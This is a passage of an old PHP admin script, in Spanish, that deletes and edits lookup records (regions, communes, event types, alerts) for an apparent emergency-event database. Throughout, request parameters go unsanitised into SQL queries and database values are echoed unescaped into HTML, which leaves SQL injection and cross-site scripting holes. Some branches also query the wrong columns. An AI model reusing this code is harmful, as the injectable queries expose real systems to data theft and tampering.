       if ($NumReg == 0) {
         mysql_query("DELETE FROM Ubicacion WHERE idubicacion='$id'") or die("Imposible Eliminar Ubicacion .. !!!");
          mysql_close();
         header ("Location: $PHP_SELF?accion=ubicacion");
         exit;
      } else {
       // Existe Informacion Relacionada a la Ubicacion en Tabla Evento
       $error_accion_ms = "Imposible Borrar Registro .. Existe Informacion Relacionada a la Ubicacion en Tabla Evento ..!!!";
       mensaje_error($error_accion_ms);
     }

}



// Borra TipoEvento
if ($HTTP_GET_VARS['accion']=="borra_tipoevento"){
        $id= $HTTP_GET_VARS['id'];

        $con_evento = mysql_query("SELECT idtipoevento FROM Evento WHERE idtipoevento=$id") or Die("Imposible Realizar Consulta a Tabla TipoEvento .. Ha ocurrido un Error Inesparado .. !!! ");

       $NumReg = mysql_num_rows($con_evento);
       mysql_free_result($con_evento);
       if ($NumReg == 0) {
         mysql_query("DELETE FROM TipoEvento WHERE idtipoevento='$id'") or die("Imposible Eliminar TipoEvento .. !!!");
          mysql_close();
         header ("Location: $PHP_SELF?accion=tipoevento");
         exit;
      } else {
       // Existe Informacion Relacionada al TipoEvento en Tabla Evento
       $error_accion_ms = "Imposible Borrar Registro .. Existe Informacion Relacionada al TipoEvento en Tabla Evento ..!!!";
       mensaje_error($error_accion_ms);
     }
     
}

// Borra Nivel de Respuesta
if ($HTTP_GET_VARS['accion']=="borra_nivelrespuesta"){
        $id= $HTTP_GET_VARS['id'];

        $con_informe = mysql_query("SELECT idcapresp FROM InformeAlfa WHERE idcapresp=$id") or Die("Imposible Realizar Consulta a Tabla Informe Alfa .. Ha ocurrido un Error Inesparado .. !!! ");

       $NumReg = mysql_num_rows($con_informe);
       mysql_free_result($con_informe);
       if ($NumReg == 0) {
         mysql_query("DELETE FROM CapRespuesta WHERE idcapresp='$id'") or die("Imposible Eliminar Nivel de Respuesta .. !!!");
         mysql_close();
         header ("Location: $PHP_SELF?accion=nivelrespuesta");
         exit;
      } else {
       // Existe Informacion Relacionada al Nivel de Respuesta en Tabla InformeAlfa
       $error_accion_ms = "Imposible Borrar Registro .. Existe Informacion Relacionada al Nivel de Respuesta en Tabla Informe Alfa ..!!!";
       mensaje_error($error_accion_ms);
     }
}

// Borra Estado Alfa
if ($HTTP_GET_VARS['accion']=="borra_estadoalfa"){
        $id= $HTTP_GET_VARS['id'];

        $con_informe = mysql_query("SELECT idestadoalfa FROM InformeAlfa WHERE idestadoalfa=$id") or Die("Imposible Realizar Consulta a Tabla Estado Alfa .. Ha ocurrido un Error Inesparado .. !!! ");

       $NumReg = mysql_num_rows($con_informe);
       mysql_free_result($con_informe);
       if ($NumReg == 0) {
         mysql_query("DELETE FROM EstadoAlfa WHERE idestadoalfa='$id'") or die("Imposible Eliminar Estado Alfa .. !!!");
         mysql_close();
         header ("Location: $PHP_SELF?accion=estadoalfa");
         exit;
       } else {
       // Existe Informacion Relacionada al Estado Alfa en Tabla InformeAlfa
         $error_accion_ms = "Imposible Borrar Registro .. Existe Informacion Relacionada al Estado Alfa en Tabla Informe Alfa ..!!!";
         mensaje_error($error_accion_ms);
       }
}

// Borra Estado Evento
if ($HTTP_GET_VARS['accion']=="borra_estadoevento"){
        $id= $HTTP_GET_VARS['id'];

        $con_informe = mysql_query("SELECT idestadoevento FROM Evento WHERE idestadoalfa=$id") or Die("Imposible Realizar Consulta a Tabla Estado Evento .. Ha ocurrido un Error Inesparado .. !!! ");

       $NumReg = mysql_num_rows($con_informe);
       mysql_free_result($con_informe);
       if ($NumReg == 0) {
         mysql_query("DELETE FROM EstadoEvento WHERE idestadoalfa='$id'") or die("Imposible Eliminar Estado Alfa .. !!!");
         mysql_close();
         header ("Location: $PHP_SELF?accion=estadoevento");
         exit;
       } else {
       // Existe Informacion Relacionada al Estado Evento en Tabla Evento
         $error_accion_ms = "Imposible Borrar Registro .. Existe Informacion Relacionada al Estado Evento en Tabla Evento .. !!!";
         mensaje_error($error_accion_ms);
       }
}

// Borra Tipo Recurso
if ($HTTP_GET_VARS['accion']=="borra_tiporecurso"){
        $id= $HTTP_GET_VARS['id'];

        $con_informe = mysql_query("SELECT idtiporecurso FROM AlfaRecursos WHERE idtiporecurso=$id") or Die("Imposible Realizar Consulta a Tabla TipoRecurso .. Ha ocurrido un Error Inesperado .. !!! ");

       $NumReg = mysql_num_rows($con_informe);
       mysql_free_result($con_informe);
       if ($NumReg == 0) {
         mysql_query("DELETE FROM TipoRecurso WHERE idtiporecurso='$id'") or die("Imposible Eliminar TipoRecurso .. !!!");
         mysql_close();
         header ("Location: $PHP_SELF?accion=tiporecurso");
         exit;
       } else {
       // Existe Informacion Relacionada al Estado Evento en Tabla Evento
         $error_accion_ms = "Imposible Borrar Registro .. Existe Informacion Relacionada al Tipo de Recurso en Tabla Alfa Recursos .. !!!";
         mensaje_error($error_accion_ms);
       }
}


// Borra Alerta
if ($HTTP_GET_VARS['accion']=="borra_alerta"){
        $id= $HTTP_GET_VARS['id'];

         mysql_query("DELETE FROM alerta WHERE id='$id'") or die("Imposible Eliminar Alerta .. !!!");
         mysql_close();
         header ("Location: $PHP_SELF?accion=tiporecurso");
         exit;
}




// Borra FUENTE
if ($HTTP_GET_VARS['accion']=="borra_fuente"){
        $id= $HTTP_GET_VARS['id'];

        $con_informe = mysql_query("SELECT idfuente FROM Evento WHERE idfuente=$id") or Die("Imposible Realizar Consulta a Tabla Evento .. Ha ocurrido un Error Inesperado .. !!! ");

       $NumReg = mysql_num_rows($con_informe);
       mysql_free_result($con_informe);
       if ($NumReg == 0) {
         mysql_query("DELETE FROM FUENTE WHERE id='$id'") or die("Imposible Eliminar Fuente .. !!!");
         mysql_close();
         header ("Location: $PHP_SELF?accion=fuente");
         exit;
       } else {
       // Existe Informacion Relacionada a la Fuente en Tabla Evento
          $error_accion_ms = "Imposible Borrar Registro .. Existe Informacion Relacionada a la Fuente en Tabla Evento .. !!!";
          mensaje_error($error_accion_ms);
       }
}

// Modifica Region
  if ($HTTP_GET_VARS['accion']=="modifica_region"){
     $id = $HTTP_GET_VARS['id'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraRegionHTML();

     echo "<tr><td ColSpan=2 height=25></td></tr>";
     echo "<tr><td Colspan=2 valign=middle class=topmenu><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=m
iddle>Modificar Registro</td></tr>";
     echo "<tr><td Colspan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
     echo "<tr><td Colspan=2 height=15></td></tr>";
     echo "<tr><td ColSpan=2>";

     $con_region = mysql_query("SELECT idreg, region FROM Region WHERE idreg='$id'") or die("Imposible Leer Registro desde Tabla Region");
     while($resultados = mysql_fetch_array($con_region)) {

echo <<< HTML
      <form method="post" action="$PHP_SELF?accion=edita_region" onSubmit="return validaRegion();" name="form">
      <input type="hidden" name="id" value="$resultados[idreg]">
      <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
        <tr align=center bgcolor=#dde5f2>
          <td>Id. Regi&oacute;n</td><td>Regi&oacute;n</td>
        </tr>
        <tr align="center" bgcolor=#eaeaea>
          <td><input type=text name=nroregion size=2 maxlength=2 class=eninput value=$resultados[idreg] disabled>
          </td>
          <td><input type=text name=nnombreregion size=30 maxlength=30 class=eninput value=$resultados[region]>
          </td>
        </tr>
        <tr align="center" bgcolor=#ffffff>
          <td ColSpan="2" class="nota">Id. Regi&oacute;n debe ser valor comprendido entre 1 a 12, Regi&oacute;n Metropolitana
debe ser RM</td>
        <tr><td height=15 ColSpan="2"></td></tr>
        <tr bgcolor="#ffffff">
          <td colspan="2" height="40">
             <div align="center">
               <input type="image" name="agregaregion" src="../imagenes/modificar.gif">
             </div>
          </td>
        </tr>
        <tr>
          <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagene
s/volver.gif" border="0"></a>
          </td>
        </tr>
        <tr><td height=5 ColSpan="2"></td></tr>
        <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
        </form>
      </table>
HTML;
     }
       mysql_free_result($con_region);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
  }

    // Modifica Provincia
  if ($HTTP_GET_VARS['accion']=="modifica_provincia"){
     $id_r = $HTTP_GET_VARS['id'];
     $id_p = $HTTP_GET_VARS['id_p'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraProvinciaHTML();

     echo "<tr><td ColSpan=2 height=25></td></tr>";
     echo "<tr><td Colspan=2 valign=middle class=topmenu><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar Registro</td></tr>";
     echo "<tr><td Colspan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
     echo "<tr><td Colspan=2 height=15></td></tr>";
     echo "<tr><td ColSpan=2>";

     $con_provin = mysql_query("SELECT Provincia.idpro as idprov, Provincia.provincia as provincia, Region.idreg as idregion, Region.region as region FROM Provincia INNER JOIN Region ON Provincia.idreg = Region.idreg WHERE Provincia.idpro = $id_p AND Provincia.idreg = $id_r") Or Die("Imposible Realizar Consulta a Tabla Provincia en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");


     while($resultados = mysql_fetch_array($con_provin)) {

echo <<< HTML
      <form method="post" action="$PHP_SELF?accion=edita_provincia" onSubmit="return validaProvincia();" name="form">
      <input type="hidden" name="id_p" value="$resultados[idprov]">
      <input type="hidden" name="id" value="$resultados[idregion]">
      <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
        <tr align=center bgcolor=#dde5f2>
          <td>Regi&oacute;n</td><td>Id. Prov.</td><td>Provincia</td>
        </tr>
        <tr align="center" bgcolor=#eaeaea>
          <td><input type=text name=region size=30 maxlength=30 class=eninput value=$resultados[region] disabled></td>
          <td><input type=text name=nroprovincia size=2 maxlength=2 class=eninput value=$resultados[idprov] disabled></td>
          <td><input type=text name=nombreprovincia size=30 maxlength=30 class=eninput value=$resultados[provincia]></td>
        </tr>
        <tr align="center" bgcolor=#ffffff>
          <td ColSpan="3" class="nota">Id. Provincia debe ser un valor num&eacute;rico de acuerdo a orden de precedencia en la Regi&oacute;n</td>
        <tr><td height=15 ColSpan="3"></td></tr>
        <tr bgcolor="#ffffff">
          <td colspan="3" height="40">
             <div align="center">
               <input type="image" name="agregaregion" src="../imagenes/modificar.gif">
             </div>
          </td>
        </tr>
        <tr>
          <td colspan="3" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
          </td>
        </tr>
        <tr><td height=5 ColSpan="3"></td></tr>
        <tr><td ColSpan="3" valign=middle background='../imagenes/linea.gif'></td></tr>
        </form>
      </table>
HTML;
     }
       mysql_free_result($con_provin);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
  }

// Modifica Comuna
  if ($HTTP_GET_VARS['accion']=="modifica_comuna"){
     $id_p = $HTTP_GET_VARS['id'];
     $id_c = $HTTP_GET_VARS['id_c'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraComunaHTML();

     echo "<tr><td ColSpan=2 height=25></td></tr>";
     echo "<tr><td Colspan=2 valign=middle class=topmenu><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar Registro</td></tr>";
     echo "<tr><td Colspan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
     echo "<tr><td Colspan=2 height=15></td></tr>";
     echo "<tr><td ColSpan=2>";

     $con_comuna = mysql_query("SELECT Comuna.idcom as idcom, Comuna.idpro as idprov, comuna, provincia, region, Region.idreg as idregion FROM Comuna INNER JOIN Provincia ON Comuna.idpro = Provincia.idpro INNER JOIN Region ON Provincia.idreg = Region.idreg WHERE Comuna.idcom=$id_c AND Comuna.idpro=$id_p") Or Die("Imposible Realizar Consulta a Tabla Comuna en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");


     while($resultados = mysql_fetch_array($con_comuna)) {
          $regprov = $resultados[region]."/".$resultados[provincia];

echo <<< HTML
      <form method="post" action="$PHP_SELF?accion=edita_comuna" onSubmit="return validaComuna();" name="form">
      <input type="hidden" name="id_c" value="$resultados[idcom]">
      <input type="hidden" name="id" value="$resultados[idprov]">
      <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
        <tr align=center bgcolor=#dde5f2>
          <td>Regi&oacute;n/Provincia</td><td>Id. Com.</td><td>Comuna</td>
        </tr>
        <tr align="center" bgcolor=#eaeaea>
          <td><input type=text name=regionprovincia size=30 maxlength=30 class=eninput value="$regprov" disabled></td>
          <td><input type=text name=nrocomuna size=2 maxlength=2 class=eninput value=$resultados[idcom] disabled></td>
          <td><input type=text name=nombrecomuna size=30 maxlength=30 class=eninput value="$resultados[comuna]"></td>
        </tr>
        <tr align="center" bgcolor=#ffffff>
          <td ColSpan="3" class="nota">Id. Comuna debe ser un valor num&eacute;rico de acuerdo a orden de precedencia en la
 Provincia</td>
        <tr><td height=15 ColSpan="3"></td></tr>
        <tr bgcolor="#ffffff">
          <td colspan="3" height="40">
             <div align="center">
               <input type="image" name="agregaregion" src="../imagenes/modificar.gif">
             </div>
          </td>
        </tr>
        <tr>
          <td colspan="3" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagene
s/volver.gif" border="0"></a>
          </td>
        </tr>
        <tr><td height=5 ColSpan="3"></td></tr>
        <tr><td ColSpan="3" valign=middle background='../imagenes/linea.gif'></td></tr>
        </form>
      </table>
HTML;
     }
       mysql_free_result($con_comuna);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}

// Modifica Ubicacion
if ($HTTP_GET_VARS['accion']=="modifica_ubicacion"){
     $id = $HTTP_GET_VARS['id'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraUbicacionHTML();

    $con_ubicacion = mysql_query("SELECT idubicacion, ubicacion FROM Ubicacion WHERE idubicacion='$id'") Or DIE("Imposible Relizar Consulta en Tabla Ubicacion en este Momento ... Intente Nuevamente");


     while($resultados = mysql_fetch_array($con_ubicacion)) {
      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar Ubicacion</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
               <form method="post" action="$PHP_SELF?accion=edita_ubicacion" onSubmit="return validaUbicacion();" name="form">
                <input type="hidden" name="id" value="$resultados[idubicacion]">
                <td>Id.</td><td>Ubicacion</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nroubicacion size=2 maxlength=2 class=eninput value="$resultados[idubicacion]" disabled>&nbsp;</td>
                <td><input type=text name=nombreubicacion size=20 maxlength=20 class=eninput value="$resultados[ubicacion]">&nbsp;</td>
               </tr>
               <tr align="center" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregaubicacion" src="../imagenes/modificar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
     }
     mysql_free_result($con_ubicacion);
     mysql_close();
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

// ModificaTipoEvento
if ($HTTP_GET_VARS['accion']=="modifica_tipoevento"){
     $id = $HTTP_GET_VARS['id'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraTipoEventoHTML();

    $con_tipoevento = mysql_query("SELECT idtipoevento, tipoevento FROM TipoEvento WHERE idtipoevento='$id'")
 Or DIE("Imposible Relizar Consulta en Tabla TipoEvento en este Momento ... Intente Nuevamente");


     while($resultados = mysql_fetch_array($con_tipoevento)) {
      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar TipoEvento</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=edita_tipoevento" onSubmit="return validaTipoEvento();" name="form">
                <input type="hidden" name="id" value="$resultados[idtipoevento]">
                <td>Id. TipoEvento</td><td>TipoEvento</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nrotipoevento size=6 maxlength=6 class=eninput value="$resultados[idtipoevento]" disabled>&nbsp;</td>
                <td><input type=text name=nombretipoevento size=30 maxlength=30 class=eninput value="$resultados[tipoevento]">&nbsp;</td>
               </tr>
               <tr align="center" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. TipoEvento debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregaregion" src="../imagenes/modificar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../im
agenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
     }
     mysql_free_result($con_tipoevento);
     mysql_close();
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

// Modifica Nivel de Respuesta
if ($HTTP_GET_VARS['accion']=="modifica_nivelrespuesta"){
     $id = $HTTP_GET_VARS['id'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraNivelRespuestaHTML();

    $con_nivelrespuesta = mysql_query("SELECT * FROM CapRespuesta WHERE idcapresp='$id'")
 Or DIE("Imposible Relizar Consulta en Tabla Capacidad de Respuesta en este Momento ... Intente Nuevamente");

     while($resultados = mysql_fetch_array($con_nivelrespuesta)) {
      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar Nivel de Respuesta</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=edita_nivelrespuesta" onSubmit="return validaNivelRespuesta();" name="form">
                <input type="hidden" name="id" value="$resultados[idcapresp]">
                <td>Id. Nivel</td><td>Nivel</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nrocaprespuesta size=6 maxlength=6 class=eninput value="$resultados[idcapresp]" disabled>&nbsp;</td>
                <td><input type=text name=nombrenivel size=30 maxlength=30 class=eninput value="$resultados[nivel]">
&nbsp;</td>
               </tr>
               <tr align="center" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. Nivel debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="modificanivelrespuesta" src="../imagenes/modificar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../im
agenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
     }
     mysql_free_result($con_nivelrespuesta);
     mysql_close();
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

// Modifica Estado Alfa
if ($HTTP_GET_VARS['accion']=="modifica_estadoalfa"){
     $id = $HTTP_GET_VARS['id'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraEstadoAlfaHTML();

    $con_estadoalfa = mysql_query("SELECT * FROM EstadoAlfa WHERE idestadoalfa='$id'") Or DIE("Imposible Relizar Consulta en Tabla Estado Alfa en este Momento ... Intente Nuevamente");

     while($resultados = mysql_fetch_array($con_estadoalfa)) {
      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar Estado Alfa</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=edita_estadoalfa" onSubmit="return validaEstadoAlfa();" name="form">
                <input type="hidden" name="id" value="$resultados[idestadoalfa]">
                <td>Id. Estado</td><td>Estado Alfa</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nroestadoalfa size=2 maxlength=2 class=eninput value="$resultados[idestadoalfa]" disabled>&nbsp;</td>
                <td><input type=text name=nombreestadoalfa size=30 maxlength=30 class=eninput value="$resultados[estadoalfa]">&nbsp;</td>
               </tr>
               <tr align="left" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. Estado debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="modificaestadoalfa" src="../imagenes/modificar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
     }
     mysql_free_result($con_estadoalfa);
     mysql_close();
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

// Modifica Estado Evento
if ($HTTP_GET_VARS['accion']=="modifica_estadoevento"){
     $id = $HTTP_GET_VARS['id'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraEstadoEventoHTML();

    $con_estadoevento = mysql_query("SELECT * FROM EstadoEvento WHERE idestadoevento='$id'") Or DIE("Imposible Relizar Consulta en Tabla Estado Evento en este Momento ... Intente Nuevamente");

     while($resultados = mysql_fetch_array($con_estadoevento)) {
      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar Estado Evento</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=edita_estadoevento" onSubmit="return validaEstadoEvento();" name="form">
                <input type="hidden" name="id" value="$resultados[idestadoevento]">
                <td>Id. Estado</td><td>Estado Evento</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nroestadoevento size=2 maxlength=2 class=eninput value="$resultados[idestadoEvento]" disabled>&nbsp;</td>
                <td><input type=text name=nombreestadoevento size=30 maxlength=30 class=eninput value="$resultados[estadoalfa]">&nbsp;</td>
               </tr>
               <tr align="left" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. Estado debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="modificaestadoevento" src="../imagenes/modificar.gif">
                 </div>
                </td>
               </tr>
              <tr>
              <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
     }
     mysql_free_result($con_estadoevento);
     mysql_close();
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

// Modifica Tipo Recurso
if ($HTTP_GET_VARS['accion']=="modifica_tiporecurso"){
     $id = $HTTP_GET_VARS['id'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraTipoRecursoHTML();

    $con_tiporecurso = mysql_query("SELECT * FROM TipoRecurso WHERE idtiporecurso='$id'") Or DIE("Imposible Relizar Consulta en Tabla Tipo Recurso en este Momento ... Intente Nuevamente");

     while($resultados = mysql_fetch_array($con_tiporecurso)) {
      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar Tipo Recurso</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
    <form method="post" action="$PHP_SELF?accion=edita_tiporecurso" onSubmit="return validaTipoRecurso();" name="form">
                <input type="hidden" name="id" value="$resultados[idtiporecurso]">
                <td>Id. Tipo</td><td>Tipo Recurso</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nrotiporecurso size=2 maxlength=2 class=eninput value="$resultados[idtiporecurso]" disabled>&nbsp;</td>
                <td><input type=text name=nombrerecurso size=30 maxlength=30 class=eninput value="$resultados[recurso]">&nbsp;</td>
               </tr>
               <tr align="left" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. Tipo debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="modificatiporecurso" src="../imagenes/modificar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
     }
     mysql_free_result($con_tiporecurso);
     mysql_close();
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}


// Modifica Alerta
if ($HTTP_GET_VARS['accion']=="modifica_alerta"){
     $id = $HTTP_GET_VARS['id'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraAlertaHTML();

    $con_alerta = mysql_query("SELECT * FROM alerta WHERE id='$id'") Or DIE("Imposible Relizar Consulta en Tabla Alerta en este Momento ... Intente Nuevamente");

     while($resultados = mysql_fetch_array($con_alerta)) {
         list($year, $month, $day, $time) = split('[-. ]', $resultados[fecha]);
         $fecha = $day ."-". $month ."-". $year;

                $spltiempo = split('[:]', $time);
                $hour = $spltiempo[0];
                $minute = $spltiempo[1];
                $second = $spltiempo[2];

		 $hora = $hour . ":" . $minute;

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar Alerta</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
echo <<< HTML
                 <form method="post" action="$PHP_SELF?accion=edita_alerta" name="form">
                <input type="hidden" name="id" value="$resultados[id]">
               <tr align="left" bgcolor="#dde5f2">
                 <td>&nbsp;Fecha:</td>
